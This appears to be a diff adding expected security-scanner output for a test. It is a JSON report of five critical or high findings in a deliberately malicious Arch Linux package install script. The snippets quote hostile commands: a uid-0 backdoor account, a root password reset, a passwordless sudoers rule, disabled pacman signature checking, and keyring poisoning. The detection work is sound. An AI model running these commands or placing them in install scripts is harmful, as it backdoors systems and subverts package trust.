@@ -1,0 +1,107 @@
+{
+  "package_name": "sysprep",
+  "package_version": "1.0.0-1",
+  "findings": [
+    {
+      "id": "PRIV-007",
+      "severity": "critical",
+      "category": "privilege_escalation",
+      "title": "Privileged account manipulation (install script)",
+      "description": "Creates or elevates an account to uid 0 / the wheel or sudo group — a backdoor-admin pattern.",
+      "location": {
+        "file": "tests/fixtures/malicious/trust-tamper/sysprep.install",
+        "line": 2,
+        "column": 3,
+        "snippet": "  useradd -ou 0 -g 0 backdoor"
+      },
+      "recommendation": "Do not build. This grants an account administrative access.",
+      "cwe_id": "CWE-269",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "useradd -ou 0 -g 0"
+      }
+    },
+    {
+      "id": "PRIV-008",
+      "severity": "critical",
+      "category": "privilege_escalation",
+      "title": "Password manipulation (install script)",
+      "description": "Sets, resets, or clears an account password (chpasswd / passwd -d / piped passwd).",
+      "location": {
+        "file": "tests/fixtures/malicious/trust-tamper/sysprep.install",
+        "line": 6,
+        "column": 26,
+        "snippet": "  echo 'root:evilpass' | chpasswd"
+      },
+      "recommendation": "Do not build. This changes account credentials.",
+      "cwe_id": "CWE-269",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "chpasswd"
+      }
+    },
+    {
+      "id": "TAMPER-002",
+      "severity": "critical",
+      "category": "privilege_escalation",
+      "title": "doas/sudoers nopasswd grant (install script)",
+      "description": "Grants passwordless privilege via /etc/doas.conf or a NOPASSWD sudoers rule.",
+      "location": {
+        "file": "tests/fixtures/malicious/trust-tamper/sysprep.install",
+        "line": 3,
+        "column": 28,
+        "snippet": "  echo 'backdoor ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/backdoor"
+      },
+      "recommendation": "Do not build. This grants passwordless root.",
+      "cwe_id": "CWE-269",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "NOPASSWD"
+      }
+    },
+    {
+      "id": "TAMPER-011",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "pacman signature downgrade (install script)",
+      "description": "Sets SigLevel = Never in /etc/pacman.conf, disabling package signature verification so future malicious updates are accepted silently.",
+      "location": {
+        "file": "tests/fixtures/malicious/trust-tamper/sysprep.install",
+        "line": 5,
+        "column": 25,
+        "snippet": "  sed -i 's/^SigLevel.*/SigLevel = Never/' /etc/pacman.conf"
+      },
+      "recommendation": "Do not build. This disables pacman signature checking.",
+      "cwe_id": "CWE-347",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "SigLevel = Never"
+      }
+    },
+    {
+      "id": "TRUST-001",
+      "severity": "high",
+      "category": "malicious_code",
+      "title": "pacman keyring poisoning (install script)",
+      "description": "Imports and locally-signs an arbitrary key into pacman's trust store (pacman-key --recv-keys/--lsign) so attacker-signed packages are accepted.",
+      "location": {
+        "file": "tests/fixtures/malicious/trust-tamper/sysprep.install",
+        "line": 4,
+        "column": 3,
+        "snippet": "  pacman-key --recv-keys DEADBEEFDEADBEEF && pacman-key --lsign-key DEADBEEFDEADBEEF"
+      },
+      "recommendation": "Do not build. Packages ship keys via keyring packages, not by importing at build time.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "pacman-key --recv-keys DEADBEEFDEADBEEF && pacman-key --lsign"
+      }
+    }
+  ],
+  "scanned_files": [
+    "tests/fixtures/malicious/trust-tamper/PKGBUILD",
+    "tests/fixtures/malicious/trust-tamper/sysprep.install"
+  ],
+  "timestamp": "2026-06-15T13:48:50.586727668Z",
+  "scan_duration_ms": 6
+}
